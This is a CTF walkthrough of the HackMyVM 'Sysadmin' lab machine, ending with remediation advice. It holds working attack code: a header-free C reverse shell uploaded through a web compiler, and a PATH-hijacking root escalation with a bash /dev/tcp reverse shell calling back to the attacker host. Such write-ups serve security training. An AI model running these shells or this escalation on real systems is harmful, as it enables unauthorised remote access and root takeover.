---
title: HackMyVM - Sysadmin Walkthrough
description: Step-by-step walkthrough of the Sysadmin vulnerable machine.
publishDate: "2025-10-26T16:00:00Z"
---

![Pwned machine](/portfolio/sysadmin.png)  
*Figure 1: Pwned machine*

# HackMyVM — Sysadmin Walkthrough

**Step-by-step walkthrough of the Sysadmin vulnerable machine.**

---

## Introduction

This walkthrough demonstrates the process of identifying and exploiting vulnerabilities on the **Sysadmin** machine. The machine features a web application that allows C code upload and compilation, teaching blind command execution, constraint-based exploitation (nostdinc), process management, and privilege escalation via PATH hijacking with misconfigured sudo.

---

## Description

**Sysadmin** is a CTF challenge that involves exploiting a web-based C compiler with restricted headers (`-nostdinc`). Players must craft a reverse shell without standard library includes, handle binary deletion through process forking, and escalate privileges by exploiting a sudo rule with `!env_reset` combined with a script using relative paths.

---

## Lab setup

- **Attacker**: Kali Linux (host) — `192.168.56.101`  
- **Target**: Sysadmin VM — `192.168.56.210`  
- **Virtualization**: Oracle VirtualBox (isolated lab network)  
- **Tools**: `nc`, `gcc`, manual syscall declarations

---

## Reconnaissance

### Tip — Local DNS mapping

Add a hosts entry for convenience:

```
192.168.56.210  sysadmin
```

Scan the target:

```bash
nmap -T4 -A -v sysadmin
```

**Relevant results:**

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu ...
80/tcp open  http    Apache httpd
```

> **Observation:** Apache web server (HTTP) and SSH.



You can then use `http://sysadmin/` instead of the raw IP.

---

### Initial discovery

The target is running an Apache web server with a webpage that accepts C code uploads. The code is compiled with the following command. This was found on the source code of the page:

```bash
gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out
```

**Key observations:**

- `-nostdinc`: Standard C includes are disabled
- `-I/var/www/include`: Custom headers available
- `-z execstack`: Stack is executable (shellcode-friendly)
- `-fno-stack-protector`: No stack canaries
- `-no-pie`: Position Independent Executable disabled
- **Binary is deleted immediately after execution**
- **No output is visible from execution**

> **Challenge:** Blind command execution with no standard library and ephemeral binary.

---

## Understanding the constraints

### The `-nostdinc` problem

Standard C library headers are unavailable:
- ❌ No `#include <sys/socket.h>`
- ❌ No `#include <unistd.h>`
- ❌ No `#include <netinet/in.h>`

**Solution:** Manually declare system functions and constants.

### The blind execution problem

No output from the compiled binary makes debugging impossible.

**Solution:** Use out-of-band communication (reverse shell).

### The binary deletion problem

The notice states: "Your compiled binary will be deleted immediately after execution."

**Solution:** Fork the process so the child survives parent termination.

---

## Initial foothold — Reverse shell as `echo` user

### Building the exploit

Create a C program that:
1. Manually declares required functions
2. Establishes a reverse shell connection
3. Forks to survive binary deletion

**Exploit code:**

```c
// Manually declare system functions
int socket(int, int, int);
int connect(int, const void*, unsigned long);
int dup2(int, int);
int execve(const char*, char* const[], char* const[]);
int fork(void);

// Define constants
#define AF_INET 2
#define SOCK_STREAM 1

struct sockaddr_in {
    unsigned short sin_family;
    unsigned short sin_port;
    unsigned int sin_addr;
    char sin_zero[8];
};

int main() {
    // Fork to create a child process
    if(fork() != 0) {
        return 0;  // Parent exits immediately
    }
    
    // Child continues here
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = 0x5C11;  // port 4444 in network byte order
    addr.sin_addr = 0x6538A8C0;  // 192.168.56.101 in network byte order
    
    int i;
    for(i = 0; i < 8; i++) {
        addr.sin_zero[i] = 0;
    }
    
    connect(sock, (void*)&addr, 16);
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    char *argv[] = {"/bin/sh", 0};
    execve("/bin/sh", argv, 0);
    
    return 0;
}
```

### IP address conversion

Converting `192.168.56.101` to network byte order:
- 192 = 0xC0
- 168 = 0xA8
- 56 = 0x38
- 101 = 0x65
- Network byte order (big-endian): 0xC0A83865
- x86 little-endian representation: **0x6538A8C0**

### Getting the shell

Start listener on attacker machine:

```bash
nc -lvnp 4444
```

Upload the C code to the web application.

**Result:**

```
listening on [any] 4444 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.210] 50064
```

Verify identity:

```bash
whoami
```

Output:

```
echo
```

> **Success:** We have a shell as the `echo` user.

---

## Privilege escalation enumeration

### Check for SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Results:**

```
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/libexec/polkit-agent-helper-1
```

> **Observation:** Standard SUID binaries, nothing unusual.

### Check sudo permissions

```bash
sudo -l
```

**Output:**

```
Matching Defaults entries for echo on Sysadmin:
    !env_reset, mail_badpass, !env_reset, always_set_home

User echo may run the following commands on Sysadmin:
    (root) NOPASSWD: /usr/local/bin/system-info.sh
```

> **Key findings:**
> - Can run `/usr/local/bin/system-info.sh` as root without password
> - **`!env_reset`** means environment variables are NOT reset

---

## Analyzing the vulnerable script

### Check script permissions

```bash
ls -l /usr/local/bin/
```

**Output:**

```
total 8
-rwxr-xr-x 1 root root 313 Aug 14 11:07 compile_and_run.sh
-rwxr-xr-x 1 root root 650 Aug 14 09:32 system-info.sh
```

> Script is owned by root and not writable.

### Inspect script contents

```bash
cat /usr/local/bin/system-info.sh
```

**Contents:**

```bash
#!/bin/bash
#===================================
# Daily System Info Report
#===================================
echo "Starting daily system information collection at $(date)"
echo "------------------------------------------------------"
echo "Checking disk usage..."
df -h
echo "Checking log directory..."
ls -lh /var/log/
find /var/log/ -type f -name "*.gz" -mtime +30 -exec rm {} \;
echo "Checking critical services..."
systemctl is-active sshd
systemctl is-active cron
echo "Collecting CPU and memory information..."
cat /proc/cpuinfo
free -m
echo "------------------------------------------------------"
echo "Report complete at $(date)"
cd /usr/local/bin/
```

> **Vulnerability identified:** Script uses relative paths for commands (`date`, `df`, `ls`, `find`, `systemctl`, `cat`, `free`).

---

## Privilege escalation to root — PATH hijacking

### The attack vector

Since `!env_reset` is set in sudo configuration, environment variables persist when running sudo. Combined with relative command paths in the script, we can hijack the PATH to execute malicious binaries.

### Create malicious binary

Navigate to `/tmp` and create a fake `date` command:

```bash
cd /tmp
echo '#!/bin/bash' > date
echo '/bin/bash -i' >> date
chmod +x date
```

### Set up PATH hijacking

Prepend `/tmp` to PATH:

```bash
export PATH=/tmp:$PATH
```

Verify:

```bash
echo $PATH
```

**Output:**

```
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Confirm our fake `date` will be called:

```bash
which date
```

**Output:**

```
/tmp/date
```

### Execute the exploit

Run the script with sudo:

```bash
sudo /usr/local/bin/system-info.sh
```

When the script executes `$(date)` at the beginning, it runs our malicious `/tmp/date` instead of `/bin/date`, spawning a root shell.

### Alternative method — Reverse shell as root

If the direct shell hangs, use a reverse shell approach:

On attacker machine:

```bash
nc -nlvp 5555
```

Create malicious `date`:

```bash
cd /tmp
echo '#!/bin/bash' > date
echo 'bash -i >& /dev/tcp/192.168.56.101/5555 0>&1' >> date
chmod +x date
export PATH=/tmp:$PATH
sudo /usr/local/bin/system-info.sh
```

**Result:** Root shell received on port 5555.

### Verify root access

```bash
whoami
```

**Output:**

```
root
```

> **Success:** Root access achieved!

---

## Capturing the flags

```bash
cat /root/root.txt
cat /home/echo/user.txt
```

---

## Summary & remediation

**Attack path summary:**

1. **Discovery** → Web application accepts C code uploads
2. **Constraint analysis** → `-nostdinc` requires manual function declarations
3. **Exploit development** → Crafted reverse shell with manual syscalls
4. **Process survival** → Used `fork()` to survive binary deletion
5. **Initial access** → Shell as `echo` user
6. **Enumeration** → Found sudo rule with `!env_reset`
7. **Script analysis** → Identified relative paths in `system-info.sh`
8. **PATH hijacking** → Exploited environment variable persistence
9. **Root access** → Gained root shell via malicious `date` command

**Mitigations & lessons learned:**

- **Always use absolute paths** in scripts that run with elevated privileges
- **Enable `env_reset`** in sudo configuration (default secure behavior)
- **Avoid `NOPASSWD`** for scripts that don't sanitize environment
- **Input validation** on code compilation endpoints
- **Implement timeouts** for uploaded code execution
- **Use security-hardened compilation flags** consistently
- **Audit sudo rules** regularly with `sudo -l` and `visudo`

**Key techniques demonstrated:**

- Manual syscall declarations without standard headers
- Network byte order conversion for socket programming
- Process forking to survive parent process termination
- PATH hijacking with environment variable persistence
- Exploitation of relative vs absolute paths in shell scripts

---

## Conclusion

Sysadmin demonstrates how multiple layers of constraints can be bypassed through creative problem-solving. The `-nostdinc` restriction was overcome with manual declarations, binary deletion was defeated with process forking, and the privilege escalation exploited the dangerous combination of `!env_reset` and relative paths. This challenge emphasizes the importance of defense-in-depth: a single secure configuration (absolute paths OR env_reset) would have prevented the final escalation.